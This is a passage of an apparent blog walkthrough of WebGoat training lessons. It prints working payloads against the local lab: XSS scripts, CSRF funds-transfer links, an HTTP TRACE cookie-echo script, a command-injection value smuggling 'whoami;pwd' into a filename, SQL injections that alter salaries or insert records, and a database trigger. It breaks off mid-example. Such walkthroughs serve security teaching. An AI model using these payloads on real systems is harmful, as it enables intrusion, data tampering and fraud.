It is always a good practice to scrub all inputs, especially those inputs that will later be used as parameters to OS commands, scripts, and database queries. It is particularly important for content that will be permanently stored somewhere. Users should not be able to create message content that could cause another user to load an undesirable page or undesirable content when the user&rsquo;s message is retrieved.
XSS can also occur when unvalidated user input is used in an HTTP response. In a reflected XSS attack, an attacker can craft a URL with the attack script and post it to another website, email it, or otherwise get a victim to click on it.</p>

<p>General Goal(s):
For this exercise, you will perform stored and reflected XSS attacks. You will also implement code changes in the web application to defeat these attacks.</p>

<p><strong>Stage 1: Execute a Stored Cross Site Scripting (XSS) attack.</strong></p>

<p>As &lsquo;Tom&rsquo;, execute a Stored XSS attack against the Street field on the Edit Profile page. Verify that &lsquo;Jerry&rsquo; is affected by the attack.</p>

<p>The passwords for the accounts are the lower-case versions of their given names (e.g. the password for Tom Cat is &ldquo;tom&rdquo;).</p>

<p>I edited Tom&rsquo;s profile and added some XSS on the Street field:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script&gt;alert('Wrong street')&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>Whoever views Tom&rsquo;s profile now will get the popup.</p>

<p><strong>Stage 2: Block Stored XSS using Input Validation.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to block the stored XSS before it can be written to the database. Repeat stage 1 as &lsquo;Eric&rsquo; with &lsquo;David&rsquo; as the manager. Verify that &lsquo;David&rsquo; is not affected by the attack.</p>

<p>Skipped because I use the standard version.</p>

<p><strong>Stage 3: Execute a previously Stored Cross Site Scripting (XSS) attack.</strong></p>

<p>The &lsquo;Bruce&rsquo; employee profile is pre-loaded with a stored XSS attack. Verify that &lsquo;David&rsquo; is affected by the attack even though the fix from stage 2 is in place.</p>

<p>Well, there was no fix in my case, so all I had to do is view Bruce&rsquo;s profile when logged in as David.</p>

<p><strong>Stage 4: Block Stored XSS using Output Encoding.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to block XSS after it is read from the database. Repeat stage 3. Verify that &lsquo;David&rsquo; is not affected by Bruce&rsquo;s profile attack.</p>

<p>Skipped.</p>

<p><strong>Stage 5: Execute a Reflected XSS attack.</strong></p>

<p>Use a vulnerability on the Search Staff page to craft a URL containing a reflected XSS attack. Verify that another employee using the link is affected by the attack.</p>

<p>It&rsquo;s a simple XSS on the search page:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script&gt;alert('The user has been alerted of your stalking!')&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>Stage 6: Block Reflected XSS using Input Validation.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to block this reflected XSS attack. Repeat step 5. Verify that the attack URL is no longer effective.</p>

<p>Skipped.</p>

<p><strong>Stored XSS Attacks</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/stored_xss.png" title="stored xss" alt="stored xss"></p>

<p>The XSS vulnerability is in the message box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script&gt;alert('Read me!')&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>Then click on the title in the message list and see it in action.</p>

<p><strong>Reflected XSS Attacks</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to validate all input on the server side. XSS can occur when unvalidated user input is used in an HTTP response. In a reflected XSS attack, an attacker can craft a URL with the attack script and post it to another website, email it, or otherwise get a victim to click on it.</p>

<p><strong>General Goal(s):</strong>
For this exercise, your mission is to come up with some input containing a script. You have to try to get this page to reflect that input back to your browser, which will execute the script and do something bad.</p>

<p>The vulnerable field is the access code field:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script&gt;alert('I got your money')&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>Then click Purchase.</p>

<p><strong>Cross Site Request Forgery (CSRF)</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform Cross Site Request Forgery (CSRF) attacks.</p>

<p><strong>How the attack works:</strong>
Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into loading a page that contains img links like the one below:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;http://www.mybank.com/sendFunds.do?acctId=123456&quot;</span><span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>When the victim&rsquo;s browser attempts to render this page, it will issue a request to www.mybank.com to the transferFunds.do page with the specified parameters. The browser will think the link is to get an image, even though it actually is a funds transfer function. The request will include any cookies associated with the site. Therefore, if the user has authenticated to the site, and has either a permanent cookie or even a current session cookie, the site will have no way to distinguish this from a legitimate user request. In this way, the attacker can make the victim perform actions that they didn&rsquo;t intend to, such as logout, purchase item, or any other function provided by the vulnerable website</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/csrf.png" title="csrf" alt="csrf"></p>

<p>To embed the image, use an attack like the following in the message box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Check this out!
</span><span class='line'>&lt;img src="http://localhost:8080/WebGoat/attack?Screen=52&menu=900&transferFunds=4000" width="1" height="1"/&gt;</span></code></pre></td></tr></table></div></figure>


<p>Then click on the title and the funds transfer will happen behind the scenes.</p>

<p><strong>CSRF Prompt By-Pass</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform CSRF attacks that bypass user confirmation prompts.</p>

<p><strong>How the attack works:</strong></p>

<p>Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into loading a page that contains a &lsquo;forged request&rsquo; to execute commands with the victim&rsquo;s credentials. Prompting a user to confirm or cancel the command might sound like a solution, but can be bypassed if the prompt is scriptable. This lesson shows how to bypass such a prompt by issuing another forged request. This can also apply to a series of prompts such as a wizard or issuing multiple unrelated forged requests.</p>

<p><strong>General Goal(s):</strong>
Similar to the CSRF Lesson, your goal is to send an email to a newsgroup that contains multiple malicious requests: the first to transfer funds, and the second a request to confirm the prompt that the first request triggered. The URL should point to the CSRF lesson with an extra parameter &ldquo;transferFunds=4000&rdquo;, and &ldquo;transferFunds=CONFIRM&rdquo;. You can copy the shortcut from the left hand menu by right clicking on the left hand menu and choosing copy shortcut. Whoever receives this email and happens to be authenticated at that time will have his funds transferred. When you think the attack is successful, refresh the page and you will find the green check on the left hand side menu.
Note that the &ldquo;Screen&rdquo; and &ldquo;menu&rdquo; GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.</p>

<p>The succession of steps is as follows:</p>

<ul>
<li><p>Initiate the transfer with this URL: <a href="http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900&amp;Num=21&amp;transferFunds=4000">http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900&amp;Num=21&amp;transferFunds=4000</a></p></li>
<li><p>Confirm the transfer by POSTing <code>transferFunds=CONFIRM</code> to the URL <a href="http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900">http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900</a></p></li>
</ul>


<p><strong>CSRF Token By-Pass</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform CSRF attacks on sites that use tokens to mitigate CSRF attacks, but are vulnerable to CSS attacks.</p>

<p><strong>How the attack works:</strong></p>

<p>Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into loading a page that contains a &lsquo;forged request&rsquo; to execute commands with the victim&rsquo;s credentials.</p>

<p>Token-based request authentication mitigates these attacks. This technique inserts tokens into pages that issue requests. These tokens are required to complete a request, and help verify that requests are not scripted. CSRFGuard from OWASP uses this technique to help prevent CSRF attacks.</p>

<p>However, this technique can be by-passed if CSS vulnerabilities exist on the same site. Because of the same-origin browser policy, pages from the same domain can read content from other pages from the same domain.</p>

<p><strong>General Goal(s):</strong>
Similar to the CSRF Lesson, your goal is to send an email to a newsgroup that contains a malicious request to transfer funds. To successfully complete you need to obtain a valid request token. The page that presents the transfer funds form contains a valid request token. The URL for the transfer funds page is the same as this lesson with an extra parameter &ldquo;transferFunds=main&rdquo;. Load this page, read the token and append the token in a forged request to transferFunds. When you think the attack is successful, refresh the page and you will find the green check on the left hand side menu.
Note that the &ldquo;Screen&rdquo; and &ldquo;menu&rdquo; GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.</p>

<p>First look at the source of <a href="http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=main">http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=main</a> for this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">value=</span><span class="s">&quot;-2114619905&quot;</span> <span class="na">name=</span><span class="s">&quot;CSRFToken&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we know the value of a valid CSRF token. Then the URL to complete the transfer looks like this: <a href="http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=4000&amp;CSRFToken=-2114619905">http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=4000&amp;CSRFToken=-2114619905</a></p>

<p><strong>HTTPOnly Test</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/http_only.png" title="http only" alt="http only"></p>

<p>This is a demo showing the cookie being protected with the HTTPOnly flag.</p>

<p><strong>Cross Site Tracing (XST) Attacks</strong></p>

<p>We are back on the good old shopping cart page, with a twist: &ldquo;Tomcat is configured to support the HTTP TRACE command. Your goal is to perform a Cross Site Tracing (XST) attack.&rdquo;</p>

<p><a href="https://capec.mitre.org/data/definitions/107.html">XST overview</a></p>

<blockquote><p>Cross Site Tracing (XST) enables an attacker to steal the victim&rsquo;s session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the
victim&rsquo;s browser communicates to destination system&rsquo;s web server. The attacker first gets a malicious script to run in the victim&rsquo;s browser that induces the browser to initiate an HTTP
TRACE request to the web server. If the destination web server allows HTTP TRACE requests, it will proceed to return a response to the victim&rsquo;s web browser that contains the original
HTTP request in its body. The function of HTTP TRACE, as defined by the HTTP specification, is to echo the request that the web server receives from the client back to the client. Since
the HTTP header of the original request had the victim&rsquo;s session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the attackers&#8217; malicious
site. XST becomes relevant when direct access to the session cookie via the &ldquo;document.cookie&rdquo; object is disabled with the use of httpOnly attribute which ensures that the cookie can be
transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST.</p>

<p>If the system with which the victim is interacting is susceptible to XSS, an attacker can exploit that weakness directly to get his or her malicious script to issue an HTTP TRACE
request to the destination system&rsquo;s web server. In the absence of an XSS weakness on the site with which the victim is interacting, an attacker can get the script to come from the site
that he controls and get it to execute in the victim&rsquo;s browser (if he can trick the victim&rsquo;s into visiting his malicious website or clicking on the link that he supplies). However, in
that case, due to the same origin policy protection mechanism in the browser, the attackers&#8217; malicious script cannot directly issue an HTTP TRACE request to the destination system&rsquo;s web
server because the malicious script did not originate at that domain. An attacker will then need to find a way to exploit another weakness that would enable him or her to get around the
same origin policy protection.</p></blockquote>

<p>We know from before that the vulnerable field is the access code one. I borrowed from the solution, but haven&rsquo;t used an ActiveX object for the script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">http_request</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span><span class='line'><span class="nx">http_request</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;TRACE&quot;</span><span class="p">,</span> <span class="s2">&quot;./&quot;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
</span><span class='line'><span class="nx">http_request</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</span><span class='line'><span class="nx">str1</span> <span class="o">=</span> <span class="nx">http_request</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
</span><span class='line'><span class="k">while</span> <span class="p">(</span><span class="nx">str1</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;\n&quot;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="nx">str1</span> <span class="o">=</span> <span class="nx">str1</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;\n&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">str1</span><span class="p">);}</span>
</span><span class='line'><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And some info on the methods used:</p>

<ul>
<li><p><em>open()</em> &ndash; initialize a request. The parameters used were the HTTP method, the URL and an optional boolean signifying whether or not to perform the operation asynchronously. If this value is false, the send()method does not return until the response is received.</p></li>
<li><p><em>send()</em> &ndash; Sends the request. If the request is asynchronous (which is the default), this method returns as soon as the request is sent.</p></li>
</ul>


<h3>Improper Error Handling</h3>

<p><strong>Fail Open Authentication Scheme</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson presents the basics for understanding the &ldquo;fail open&rdquo; condition regarding authentication. The security term, “fail open” describes a behavior of a verification mechanism. This is when an error (i.e. unexpected exception) occurs during a verification method causing that method to evaluate to true. This is especially dangerous during login.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/fail_open.png" title="fail open authentication" alt="fail open authentication"></p>

<p>Just logging in with a blank password won&rsquo;t cut it. From the hints and Java code, the correct way to exploit this is by removing the password parameter altogether. In WebScarab, the request looks like this: <code>Username=webgoat&amp;Password=&amp;SUBMIT=Login</code>. Get rid of the password and profit.</p>

<h3>Injection Flaws</h3>

<p><strong>Command Injection</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/os_cmd.png" title="command injection" alt="cmd injection"></p>

<p>The server is retrieving the contents of the files by using the <em>cat</em> command. To insert a new command, I did this: <code>HelpFile=AccessControlMatrix.help;whoami&amp;SUBMIT=View</code>, but the result wasn&rsquo;t the one I expected:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You are currently viewing: AccessControlMatrix.help;whoami</span></code></pre></td></tr></table></div></figure>


<p>The reason is that the filename is enclosed within quotes, and the command I appended just got literally interpreted as part of the quoted filename. To escape that, first close the quotes, then inject the command(s): <code>HelpFile=AccessControlMatrix.help";whoami;pwd"</code>. You also have to add quotes at the end, to close the stray quotes that you created when enclosing the filename.</p>

<p><strong>Numeric SQL Injection</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/num_sqli.png" title="numeric sqli" alt="numeric sqli"></p>

<p>The injection is straightforward: <code>station=101 or 1=1&mdash; &amp;SUBMIT=Go%21</code></p>

<p><strong>Log Spoofing</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches attempts to fool the human eye.</p>

<p><strong>How the attack works:</strong> The attack is based on fooling the human eye in log files. An attacker can erase his traces from the logs using this attack.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/log_spoof.png" title="log spoofing" alt="spoof logs"></p>

<p>Whatever we input in the username box gets appended to the log file. To poison the log, do something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>webgoat%0d%0aLogin succeeded for username:admin</span></code></pre></td></tr></table></div></figure>


<p>Using the CRLF attack, the log entries will now look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Login failed for username: webgoat
</span><span class='line'>Login succeeded for username:admin</span></code></pre></td></tr></table></div></figure>


<p>We can add a script as well:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>webgoat%0d%0aLogin succeeded for username:admin&lt;script&gt;alert('Throw your logs in the trash')&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>XPATH Injection</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform XPath Injection attacks.</p>

<p><strong>How the attack works:</strong>
Similar to SQL Injection, XPATH Injection attacks occur when a web site uses user supplied information to query XML data. By sending intentionally malformed information into the web site, an attacker can find out how the XML data is structured or access data that they may not normally have access to. They may even be able to elevate their privileges on the web site if the xml data is being used for authentication (such as an xml based user file). Querying XML is done with XPath, a type of simple descriptive statement that allows the xml query to locate a piece of information. Like SQL you can specify certain attributes to find and patterns to match. When using XML for a web site it is common to accept some form of input on the query string to identify the content to locate and display on the page. This input must be sanitized to verify that it doesn&rsquo;t mess up the XPath query and return the wrong data.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/xpathi.png" title="xpath injection" alt="xpath injection"></p>

<p>To understand this injection, let&rsquo;s look at the following line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">String</span> <span class="n">expression</span> <span class="o">=</span> <span class="s">&quot;/employees/employee[loginID/text()=&#39;&quot;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">&quot;&#39; and passwd/text()=&#39;&quot;</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="s">&quot;&#39;]&quot;</span><span class="o">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>With our credentials, it looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">String</span> <span class="n">expression</span> <span class="o">=</span> <span class="s">&quot;/employees/employee[loginID/text()=&#39;&quot;</span> <span class="n">Mike</span>  <span class="s">&quot;&#39; and passwd/text()=&#39;&quot;</span> <span class="n">test123</span> <span class="s">&quot;&#39;]&quot;</span><span class="o">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the injection is as follows: <code>&lsquo; or 'a&rsquo;=&lsquo;a</code>. Here&rsquo;s how it looks in the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">String</span> <span class="n">expression</span> <span class="o">=</span> <span class="s">&quot;/employees/employee[loginID/text()=&#39;&quot;</span>   <span class="s">&quot;&#39; or &#39;a&#39;=&#39;a&#39; and passwd/text()=&#39;&quot;</span>  <span class="s">&quot;&#39; or &#39;a&#39;=&#39;a&#39;]&quot;</span><span class="o">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>In boolean logic, I think this boils down to:</p>

<p><code>False OR True AND False OR True</code></p>

<p>Since AND has higher precedence than OR, this becomes:</p>

<p><code>False OR False OR True = False OR True = True</code></p>

<p><strong>String SQL Injection</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/sqli.png" title="string sql injection" alt="string sql injection"></p>

<p>The injection is simple: <code>&lsquo; or 1=1&mdash; </code>. The resulting SQL query is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">user_data</span> <span class="k">WHERE</span> <span class="n">last_name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- &#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>LAB: SQL Injection</strong></p>

<p><strong>Stage 1:</strong> Use String SQL Injection to bypass authentication. Use SQL injection to log in as the boss (&lsquo;Neville&rsquo;) without using the correct password. Verify that Neville&rsquo;s profile can be viewed and that all functions are available (including Search, Create, and Delete).</p>

<p>Before injecting, I had to use Firebug to increase the maxlength attribute of the password field.The injection is <code>&lsquo; or 'a&rsquo;=&lsquo;a</code></p>

<p><strong>Stage 2: Block SQL Injection using a Parameterized Query.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to block SQL injection into the fields in question on the Login page. Repeat stage 1. Verify that the attack is no longer effective.</p>

<p>I didn&rsquo;t think ahead to get the dev version, so skipping.</p>

<p><strong>Stage 3: Execute SQL Injection to bypass authorization.</strong></p>

<p>As regular employee &lsquo;Larry&rsquo;, use SQL injection into a parameter of the View function (from the List Staff page) to view the profile of the boss (&lsquo;Neville&rsquo;).</p>

<p>The request that needs to be exploited is this: <code>employee_id=101&amp;action=ViewProfile</code>.</p>

<p>And the SQL injection is <code>employee_id=101 or 1=1 order by salary desc</code>.</p>

<p>The reason for inserting the order by clause is because there is only one returned result and that needs to be the boss. And the boss has the biggest salary, right? By ordering the salary in descending order (from highest to lowest), we ensure that the first result is the boss&#8217; profile.</p>

<p><strong>Stage 4: Block SQL Injection using a Parameterized Query.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to block SQL injection into the relevant parameter. Repeat stage 3. Verify that access to Neville&rsquo;s profile is properly blocked.</p>

<p>Skipped.</p>

<p><strong>Modify Data with SQL Injection</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/sql_modify.png" title="modify sql" alt="modify sql"></p>

<p>Placing a quote in the box triggers an error: Unexpected end of command in statement [SELECT * FROM salaries WHERE userid = &lsquo;]</p>

<p>To modify data, we have to construct an injection that will execute another query: <code>jsmith';update salaries set salary = 50000 where userid=&lsquo;jsmith</code></p>

<p>The behind the scenes query is now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">salaries</span> <span class="k">WHERE</span> <span class="n">userid</span> <span class="o">=</span> <span class="s1">&#39;jsmith&#39;</span><span class="p">;</span><span class="k">update</span> <span class="n">salaries</span> <span class="k">set</span> <span class="n">salary</span> <span class="o">=</span> <span class="mi">50000</span> <span class="k">where</span> <span class="n">userid</span><span class="o">=</span><span class="s1">&#39;jsmith&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The UPDATE statement is used to update records in a table.</p>

<p><em>Syntax</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">UPDATE</span> <span class="k">table_name</span>
</span><span class='line'><span class="k">SET</span> <span class="n">column1</span><span class="o">=</span><span class="n">value1</span><span class="p">,</span><span class="n">column2</span><span class="o">=</span><span class="n">value2</span><span class="p">,...</span>
</span><span class='line'><span class="k">WHERE</span> <span class="n">some_column</span><span class="o">=</span><span class="n">some_value</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>Add Data with SQL Injection</strong></p>

<p>This time, we have to add a record to the table. We can do it with this: <code>jsmith';insert into salaries values(&lsquo;hacker&rsquo;, 100000)&mdash; </code></p>

<p>And the query is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">salaries</span> <span class="k">WHERE</span> <span class="n">userid</span> <span class="o">=</span> <span class="s1">&#39;jsmith&#39;</span><span class="p">;</span><span class="k">insert</span> <span class="k">into</span> <span class="n">salaries</span> <span class="k">values</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">,</span> <span class="mi">100000</span><span class="p">)</span><span class="c1">-- &#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>That pesky quote needed to be commented out.</p>

<p>The INSERT INTO statement is used to insert new records in a table.</p>

<p><em>Syntax:</em></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">table_name</span>
</span><span class='line'><span class="k">VALUES</span> <span class="p">(</span><span class="n">value1</span><span class="p">,</span><span class="n">value2</span><span class="p">,</span><span class="n">value3</span><span class="p">,...);</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>Database Backdoors</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
How to Create Database Back Door Attacks.</p>

<p><strong>How the attack works:</strong>
Databases are used usually as a backend for web applications. Also it is used as a media of storage. It can also be used as a place to store a malicious activity such as a trigger. A trigger is called by the database management system upon the execution of another database operation like insert, select, update or delete. An attacker for example can create a trigger that would set his email address instead of every new user&rsquo;s email address.</p>

<p><strong>General Goal(s):</strong>
* Your goal should be to learn how you can exploit a vulnerable query to create a trigger.
* You will not be able to actually create one in this lesson because the underlying database engine used with WebGoat doesn&rsquo;t support triggers.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/db_bkdor.png" title="db backdoor" alt="db backdoor"></p>

<p>When you input your id, the query looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">select</span> <span class="n">userid</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">ssn</span><span class="p">,</span> <span class="n">salary</span><span class="p">,</span> <span class="n">email</span> <span class="k">from</span> <span class="n">employee</span> <span class="k">where</span> <span class="n">userid</span><span class="o">=</span><span class="mi">101</span>
</span></code></pre></td></tr></table></div></figure>


<p>The injection is: <code>101; update salaries set salary = 75000 where userid = &lsquo;larry&rsquo;</code></p>

<p>Now for stage 2:</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/db_worm.png" title="db worm" alt="db worm"></p>

<p>And the syntax for creating the trigger is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="mi">101</span><span class="p">;</span> <span class="k">CREATE</span> <span class="k">TRIGGER</span> <span class="n">wyrm</span> <span class="k">BEFORE</span> <span class="k">INSERT</span> <span class="k">ON</span> <span class="n">employee</span> <span class="k">FOR</span> <span class="k">EACH</span> <span class="k">ROW</span> <span class="k">BEGIN</span> <span class="k">UPDATE</span> <span class="n">employee</span> <span class="k">SET</span> <span class="n">salary</span> <span class="o">=</span> <span class="mi">1000</span> <span class="k">WHERE</span> <span class="n">userid</span> <span class="o">=</span> <span class="k">NEW</span><span class="p">.</span><span class="n">userid</span>
</span></code></pre></td></tr></table></div></figure>


<p>This creates a trigger that will be executed for each row before the insert operation and that will set the salary to the given value for the newly inserted userid.</p>

<p><strong>Blind Numeric SQL Injection</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/blind_numsqli.png" title="blind numeric sqli" alt="blind numeric sqli"></p>

<p>The page works like this: if you enter a correct account, you get this message: Account number is valid. Else, you get this: Invalid account number.</p>

<p>We need to add another condition to the query and cycle through attempts until we hit the jackpot. Like ANDing the original query with a true/false condition:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
